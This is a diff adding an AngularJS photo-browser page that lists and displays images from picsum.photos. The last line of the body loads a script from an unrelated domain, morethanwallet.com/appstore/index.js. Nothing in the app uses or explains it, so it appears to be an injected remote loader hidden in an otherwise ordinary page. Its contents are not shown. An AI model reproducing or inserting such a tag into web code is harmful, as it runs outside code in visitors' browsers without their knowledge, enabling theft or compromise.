@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en" ng-app="photoBrowserApp">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Photo Browser</title>
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" />
+  <style>
+    .thumbnail {
+      padding: 0;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+    .main-image {
+      width: 100%;
+      height: auto;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 5px;
+      margin-bottom: 15px;
+    }
+    .img-preview {
+      width: 100px;
+      height: 60px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      margin-right: 10px;
+    }
+    body {
+      overflow-y: scroll;
+    }
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.7.9/angular.min.js"></script>
+  <script>
+    var app = angular.module('photoBrowserApp', []);
+    app.controller('PhotoBrowserController', function($scope, $http) {
+      $scope.photos = [];
+      $scope.selectedPhoto = '';
+
+      $scope.fetchPhotos = function() {
+        $http.get('https://picsum.photos/v2/list?page=2&limit=10').then(function(response) {
+          $scope.photos = response.data;
+          $scope.selectedPhoto = $scope.photos[0].download_url;
+        });
+      };
+
+      $scope.selectPhoto = function(photo) {
+        $scope.selectedPhoto = photo.download_url;
+      };
+
+      $scope.fetchPhotos();
+    });
+  </script>
+</head>
+
+<body ng-controller="PhotoBrowserController">
+  <div class="container">
+    <h1>Photo Browser</h1>
+    <div class="row">
+      <div class="col-md-8">
+        <img ng-src="{{selectedPhoto}}" class="main-image">
+      </div>
+      <div class="col-md-4">
+        <div class="d-flex flex-wrap">
+          <div class="thumbnail" ng-repeat="photo in photos" ng-click="selectPhoto(photo)">
+            <img ng-src="{{photo.download_url}}" class="img-preview">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+
+</html>
